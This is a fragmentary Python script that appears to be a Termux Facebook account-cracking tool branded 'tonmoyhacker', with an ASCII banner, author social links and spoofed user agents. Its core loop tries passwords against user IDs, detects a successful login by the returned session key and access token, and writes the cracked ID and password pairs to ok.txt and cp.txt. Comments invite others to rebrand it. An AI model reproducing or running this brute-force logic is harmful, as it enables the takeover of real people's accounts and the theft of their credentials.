...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m tonmoyhacker\x1b[0m\x1b[1;97m]
...
def logo2():
 ...
 |__   __|                                |__   __| |             | |    
    ...
    | | ___  _ __  _ __ ___   ___  _   _     | |  | |__   ___  ___| |__  

    | |/ _ \| '_ \| '_ ` _ \ / _ \| | | |    | |  | '_ \ / _ \/ __| '_ \ 

    | | (_) | | | | | | | | | (_) | |_| |    | |  | | | |  __/ (__| | | |

    |_|\___/|_| |_|_| |_| |_|\___/ \__, |    |_|  |_| |_|\___|\___|_| |_|
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : Tonmoy Thech \x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : www.gitclone//github.com/tonmoyhacker \x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : www.facebook./tonmoyhasan88 \x1b[0m\x1b[1;97m]
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/tonmoyhacker/run.txt/blob/main/run.txt"])

	#yahan apni facebook id link dalna

	exit(" [=>] FACEBOOK :  https://www.facebook.com/tonmoyhasan88")
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version : 3\x1b[0m\x1b[1;97m] \033[1;37m 
...
───────────────────────────────────────────────────────× 
    ...
    """)
		...
		subprocess.check_output(["am", "start", "https://youtube.com/channel/UC_-94hQYOLjJVqMZUGXyBNw"])
...
'Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36',
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r  \033[0;97m   [=TSBD=OK=>] %s | %s\033[0;97m         "%(uid, pw))

				self.ok.append("%s|%s"%(uid, pw))

				open("ok.txt","a").write("   [=TSBD=OK=>]  %s|%s\n"%(uid, pw))

				break

			elif "www.facebook.com" in response.json()["error_msg"]:

				print("\r  \033[0;92m   [=TSBD=CP=>] %s | %s\033[0;97m         "%(uid, pw))

				self.cp.append("%s|%s"%(uid, pw))

				open("cp.txt","a").write("   [=TSBD=CP=>]  %s|%s\n"%(uid, pw))
 ...
 #TSBD copy krke apna name dal dyna
...
if len(sys.argv) == 2:
	...
	if sys.argv[1] == "--info":
		...
		print(" [*] Facebook  : https://facebook.com/tonmoyhasan88 ")

		print(" [*] Instagram : https://instagram.com/ ")

		print(" [*] YouTube   : https://youtube.com/channel/UC_-94hQYOLjJVqMZUGXyBNw ")

		exit(" [*] GitHub    : https://github.com/tonmoyhacker ")
